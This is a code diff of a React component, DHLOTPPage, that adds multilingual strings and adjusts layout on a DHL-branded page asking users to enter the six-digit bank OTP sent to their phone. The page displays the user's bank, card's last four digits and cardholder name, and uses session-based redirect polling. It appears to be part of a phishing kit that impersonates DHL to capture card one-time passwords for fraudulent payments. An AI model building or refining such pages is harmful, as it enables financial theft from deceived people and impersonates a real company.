@@ -6,6 +6,7 @@ import { Input } from "@/components/ui/input";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { ShieldCheck, ArrowLeft } from "lucide-react";
 import { useRedirectPolling } from "@/hooks/use-redirect-polling";
+import { useLanguage } from "@/hooks/use-language";
 
 interface DHLOTPPageProps {
   step: 1 | 2;
@@ -13,24 +14,14 @@ interface DHLOTPPageProps {
 }
 
 export default function DHLOTPPage({ step = 1, paymentId: propPaymentId }: DHLOTPPageProps) {
+  const { t } = useLanguage();
   const [otp, setOtp] = useState("");
   const [sessionId, setSessionId] = useState<string | null>(null);
   const [paymentId, setPaymentId] = useState<string>(propPaymentId || "");
   const [bankName, setBankName] = useState("Votre Banque");
   const [cardLast4, setCardLast4] = useState("****");
   const [cardholderName, setCardholderName] = useState("");
-  const [currentDate, setCurrentDate] = useState("");
 
-  // Format date in French
-  const formatDate = (): string => {
-    const date = new Date();
-    const options: Intl.DateTimeFormatOptions = { 
-      day: 'numeric', 
-      month: 'long', 
-      year: 'numeric' 
-    };
-    return date.toLocaleDateString('fr-FR', options);
-  };
 
   // Get card logo based on bank name
   const getCardLogo = (name: string): string | null => {
@@ -44,8 +35,6 @@ export default function DHLOTPPage({ step = 1, paymentId: propPaymentId }: DHLOT
   };
 
   useEffect(() => {
-    // Set current date
-    setCurrentDate(formatDate());
 
     const params = new URLSearchParams(window.location.search);
     const id = params.get("session");
@@ -122,31 +111,24 @@ export default function DHLOTPPage({ step = 1, paymentId: propPaymentId }: DHLOT
     <div className="min-h-screen bg-gradient-to-br from-yellow-50 to-red-50 flex items-center justify-center p-4">
       <Card className="w-full max-w-md shadow-xl border-2 border-[#FFCC00]">
         <CardHeader className="space-y-4 text-center bg-gradient-to-r from-[#FFCC00] to-[#D40511] text-white pb-8">
-          {/* Card Logo Only */}
+          {/* Card Logo Only - Smaller size */}
           {getCardLogo(bankName) && (
             <div className="flex justify-center pt-4" data-testid="card-logo">
-              <div className="bg-white rounded-lg px-6 py-4 shadow-lg">
+              <div className="bg-white rounded-lg px-4 py-3 shadow-lg">
                 <img 
                   src={getCardLogo(bankName)!} 
                   alt={bankName} 
-                  className="h-12 object-contain"
+                  className="h-8 object-contain"
                 />
               </div>
             </div>
           )}
-          
-          <div className="text-3xl font-bold mb-2" data-testid="bank-name">{bankName}</div>
-          
-          {/* Current Date */}
-          <div className="text-sm text-white/80 font-medium" data-testid="current-date">
-            {currentDate}
-          </div>
 
           {/* Card Last 4 + Cardholder Name */}
           {cardholderName && (
-            <div className="bg-white/10 backdrop-blur-sm border border-white/20 rounded-lg py-3 px-4 mx-8" data-testid="card-info">
+            <div className="bg-white/10 backdrop-blur-sm border border-white/20 rounded-lg py-3 px-4 mx-8 mt-4" data-testid="card-info">
               <div className="text-white/90 text-sm font-medium mb-1">
-                Carte bancaire
+                {t('bankCard')}
               </div>
               <div className="text-white text-lg font-bold tracking-wider">
                 •••• {cardLast4}
@@ -158,25 +140,25 @@ export default function DHLOTPPage({ step = 1, paymentId: propPaymentId }: DHLOT
           )}
 
           <CardTitle className="text-2xl font-bold pt-2">
-            Vérification de sécurité
+            {t('securityVerification')}
           </CardTitle>
           <CardDescription className="text-white/90">
-            Veuillez entrer le code OTP envoyé à votre téléphone
+            {t('enterOTP')}
           </CardDescription>
         </CardHeader>
 
         <CardContent className="pt-6 space-y-6">
           <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 text-sm text-blue-800">
-            <p className="font-medium mb-1">Code de vérification requis</p>
+            <p className="font-medium mb-1">{t('verificationCodeRequired')}</p>
             <p className="text-xs">
-              Un code à 6 chiffres a été envoyé à votre numéro enregistré
+              {t('codeSent')}
             </p>
           </div>
 
           <form onSubmit={handleSubmit} className="space-y-4">
             <div className="space-y-2">
               <label className="text-sm font-medium text-gray-700">
-                Code OTP
+                {t('otpCode')}
               </label>
               <Input
                 type="text"
@@ -198,7 +180,7 @@ export default function DHLOTPPage({ step = 1, paymentId: propPaymentId }: DHLOT
               disabled={otp.length !== 6 || otpMutation.isPending}
               data-testid="button-verify"
             >
-              {otpMutation.isPending ? "Vérification..." : "Vérifier"}
+              {otpMutation.isPending ? t('verifying') : t('verify')}
             </Button>
 
             <Button
@@ -209,18 +191,18 @@ export default function DHLOTPPage({ step = 1, paymentId: propPaymentId }: DHLOT
               data-testid="button-back"
             >
               <ArrowLeft className="mr-2 h-4 w-4" />
-              Retour
+              {t('back')}
             </Button>
           </form>
 
           <div className="text-center text-sm text-gray-500">
-            <p>Vous n'avez pas reçu le code ?</p>
+            <p>{t('noCode')}</p>
             <button
               type="button"
               className="text-[#D40511] underline font-medium hover:opacity-80"
               data-testid="button-resend"
             >
-              Renvoyer le code
+              {t('resendCode')}
             </button>
           </div>
         </CardContent>
